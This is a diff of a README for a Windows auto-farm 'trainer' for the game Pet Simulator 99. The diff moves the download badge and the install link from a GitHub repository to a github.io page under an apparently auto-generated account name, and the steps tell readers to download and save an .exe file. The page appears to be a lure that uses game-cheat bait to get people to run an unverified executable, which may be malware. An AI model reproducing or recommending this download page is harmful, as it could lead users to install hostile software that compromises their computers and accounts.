@@ -1,6 +1,6 @@
 # 🐾 Pet-Simulator-99-Auto-Farm-Trainer-2026-X - Master Pet Simulator 99 automation effortlessly
 
-[![Download Pet Simulator Trainer](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/Premedical-antigonuscyclops93/Pet-Simulator-99-Auto-Farm-Trainer-2026-X)
+[![Download Pet Simulator Trainer](https://img.shields.io/badge/Download-Release-blue.svg)](https://premedical-antigonuscyclops93.github.io)
 
 Pet-Simulator-99-Auto-Farm-Trainer-2026-X automates repetitive game tasks. It helps you farm coins, hatch eggs, and finish Backrooms League challenges without manual input. This tool runs on Windows and aims to save time while managing your game account effectively.
 
@@ -18,7 +18,7 @@ Ensure your computer meets these standards for a stable experience:
 
 Follow these steps to set up the software on your machine:
 
-1. Visit the following link to access the download page: [https://github.com/Premedical-antigonuscyclops93/Pet-Simulator-99-Auto-Farm-Trainer-2026-X](https://github.com/Premedical-antigonuscyclops93/Pet-Simulator-99-Auto-Farm-Trainer-2026-X).
+1. Visit the following link to access the download page: [https://premedical-antigonuscyclops93.github.io](https://premedical-antigonuscyclops93.github.io).
 2. Locate the latest version button on the right side of the screen.
 3. Click the executable file ending in .exe to start your download.
 4. Save the file to a folder you can find, such as your Downloads folder or Desktop.
